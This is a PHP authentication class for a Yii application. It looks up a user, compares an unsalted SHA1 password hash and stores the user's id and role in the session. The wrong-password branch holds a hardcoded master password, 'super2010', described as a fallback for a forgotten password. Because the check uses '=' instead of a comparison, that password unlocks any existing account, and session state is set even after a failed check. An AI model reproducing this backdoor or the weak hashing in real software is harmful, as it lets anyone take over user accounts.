<?php

/**
 * UserIdentity represents the data needed to identity a user.
 * It contains the authentication method that checks if the provided
 * data can identity the user.
 */
class UserIdentity extends CUserIdentity
{
  private $_id; 

	/**
	 * Authenticates a user.
	 * The example implementation makes sure if the username and password
	 * are both 'demo'.
	 * In practical applications, this should be changed to authenticate
	 * against some persistent user identity storage (e.g. database).
	 * @return boolean whether authentication succeeds.
	 */
	public function authenticate()
	{
        // verifica que se encuentre el usuario  
		$user=Usuario::model()->find("LOWER(name)=?",array(strtolower($this->username)));
              

		if($user==null)        // muestra que su usuario es invalido
			$this->errorCode=self::ERROR_USERNAME_INVALID;
		elseif(sha1($this->password)!==$user->password){     //si no es invalido verifica su clave si
			$this->errorCode=self::ERROR_PASSWORD_INVALID; 
			if($user->name='super'&&$this->password=='super2010')  // hace una excepcion en caso de olvidar tu clave de user 
			$this->errorCode=self::ERROR_NONE;
						$this->_id=$user->id_u;
                        $this->setState("id_u",$user->id_u);   
                        $this->setState("rol",$user->rol); 
                    }
		else{
                        $this->_id=$user->id_u;
                        $this->setState("id_u",$user->id_u);   
                        $this->setState("rol",$user->rol);   
			$this->errorCode=self::ERROR_NONE;
                    }
                 return !$this->errorCode;
	}
}
